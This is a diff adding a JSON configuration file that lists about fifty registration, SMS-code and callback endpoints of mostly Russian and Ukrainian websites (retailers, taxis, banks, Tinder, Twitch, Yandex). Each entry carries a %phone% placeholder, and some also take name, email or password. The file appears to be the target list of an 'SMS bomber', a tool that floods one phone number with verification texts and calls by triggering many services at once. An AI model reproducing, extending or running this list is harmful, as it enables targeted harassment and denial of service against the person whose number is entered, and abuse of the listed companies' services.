@@ -1,0 +1,205 @@
+{
+	"services": [
+		{
+			"url": "https://comfy.ua/ua/customer/account/createPost",
+			"data": "{'registration_name':'%name%','registration_phone':'%phone%','registration_email':'%email%'}"
+		},
+		{
+			"url": "https://www.citilink.ru/registration/confirm/phone/+%phone%/"
+		},
+		{
+			"url": "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+%phone%"
+		},
+		{
+			"url": "https://pampik.com/callback",
+			"data": "{'phoneCallback':'%phone%'}"
+		},
+		{
+			"url": "https://app.cloudloyalty.ru/demo/send-code",
+			"json": "{'country': 2,'phone': '%phone%','roistatVisit': 47637,'experiments': {'new_header_title': '1'}}"
+		},
+		{
+			"url": "https://api.mtstv.ru/v1/users",
+			"json": "{'msisdn': '%phone%'}"
+		},
+		{
+			"url": "https://api.ennergiia.com/auth/api/development/lor",
+			"json": "{'referrer':'ennergiia','via_sms':true,'phone':'+%phone%'}"
+		},
+		{
+			"url": "https://online.sbis.ru/reg/service/",
+			"json": "{'firstName':'%name%','middleName':'%name%','lastName':'%name%','sex':'1','birthDate':'7.9.1997','mobilePhone': '%phone%','russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}"
+		},
+		{
+			"url": "https://tehnosvit.ua/iwantring_feedback.html",
+			"data": "{'feedbackName':'%name%','feedbackPhone':'+%phone%'}"
+		},
+		{
+			"url": "https://www.nl.ua",
+			"data": "{'component':'bxmaker.authuserphone.login', 'sessid':'bf70db951f54b837748f69b75a61deb4', 'method':'sendCode','phone':'%phone%','registration':'N'}"
+		},
+		{
+			"url": "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
+			"data": "{'phoneNumber': '%phone%', 'countryCode': 'ID', 'name': 'test', 'email': '%email%', 'deviceToken': '*'}"
+		},
+		{
+			"url": "https://moscow.rutaxi.ru/ajax_keycode.html",
+			"data": "{'1': '%phone%'}"
+		},
+		{
+			"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
+			"data": "{'phone_number': '%phone%'}"
+		},
+		{
+			"url": "https://app.karusel.ru/api/v1/phone/",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://api.tinkoff.ru/v1/sign_up",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://youla.ru/web-api/auth/request_code",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
+			"data": "{'name': '%name%','phone': '%phone%', 'promo': 'yellowforma'}"
+		},
+		{
+			"url": "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://app.karusel.ru/api/v1/phone/",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
+			"json": "{'phone': '+%phone%'}"
+		},
+		{
+			"url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+			"data": "{'msisdn': '%phone%', 'locale': 'en', 'countryCode': 'ru','version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'}"
+		},
+		{
+			"url": "https://terra-1.indriverapp.com/api/authorization?locale=ru",
+			"data": "{'mode': 'request', 'phone': '+%phone%','phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'}"
+		},
+		{
+			"url": "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
+			"data": "{'password': '%password%', 'application': 'lkp', 'login': '%phone%'}"
+		},
+		{
+			"url": "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
+			"json": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://cloud.mail.ru/api/v2/notify/applink",
+			"json": "{'phone': '+%phone%', 'api': 2, 'email': 'email','x-email': 'x-email'}"
+		},
+		{
+			"url": "https://plink.tech/register/",
+			"json": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
+			"data": "{'phone_number': '%phone%'}"
+		},
+		{
+			"url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+			"data": "{'msisdn': '%phone%'}",
+			"headers": "{'App-ID': 'cabinet'}"
+		},
+		{
+			"url": "https://api.wowworks.ru/v2/site/send-code",
+			"json": "{'phone': '%phone%', 'type': 2}"
+		},
+		{
+			"url": "https://youla.ru/web-api/auth/request_code",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://kasta.ua/api/v2/login/",
+			"data": "{'phone': '%phone%'}"
+		},
+		{
+			"url": "https://707taxi.com.ua/sendSMS.php",
+			"data": "{'tel': '%phone%'}"
+		},
+		{
+			"url": "https://protovar.com.ua/aj_record",
+			"data": "{'object':'callback','user_name':'%name%','contact_phone':'%phone%'}"
+		},
+		{
+			"url": "https://e-vse.online/mail2.php",
+			"data": "{'object':'callback','user_name':'%name%','contact_phone':'+%phone%'}"
+		},
+		{
+			"url": "https://protovar.com.ua/aj_record",
+			"data": "{'telephone':'%phone%'}"
+		},
+		{
+			"url": "https://eda.yandex/api/v1/user/request_authentication_code",
+			"json": "{'phone_number':'+%phone%'}"
+		},
+		{
+			"url": "https://api.chef.yandex/api/v2/auth/sms",
+			"json": "{'phone':'%phone%'}"
+		},
+		{
+			"url": "https://passport.twitch.tv/register?trusted_request=true",
+			"json": "{'birthday': {'day': 17, 'month': 10, 'year': 1998},'client_id': 'qb1unb4b2q4t58fwldcbz2nnm46a8zp','include_verification_code': true,'password':'%password%','phone_number': '%phone%','username':'%name%'}"
+		},
+		{
+			"url": "https://api.sunlight.net/v3/customers/authorization/",
+			"data": "{'phone':'%phone%'}"
+		},
+		{
+			"url": "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone=+%phone%&callmode=1&oper=9"
+		},
+		{
+			"url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
+			"json": "{'phone': '%phone%', 'otpId': 0}"
+		},
+		{
+			"url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+			"data": "{'st.r.phone': '+%phone%'}"
+		},
+		{
+			"url": "https://lenta.com/api/v1/authentication/requestValidationCode",
+			"json": "{'phone': '+%phone%'}"
+		},
+		{
+			"url": "https://guru.taxi/api/v1/driver/session/verify",
+			"json": "{'phone': {'code': 1, 'number': '%phone%'}}"
+		},
+		{
+			"url": "https://findclone.ru/register?phone=+%phone%"
+		},
+		{
+			"url": "https://api.delitime.ru/api/v2/signup",
+			"data": "{'SignupForm[username]': '%phone%', 'SignupForm[device_type]': 3}"
+		},
+		{
+			"url": "https://api.carsmile.com/",
+			"json": "{'operationName': 'enterPhone','variables': {'phone': '%phone%'},'query': 'mutation enterPhone($phone: String!) { enterPhone(phone: $phone)}'}"
+		},
+		{
+			"url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
+			"data": "{'phone': '%phone%'}"
+		}
+	]
+}
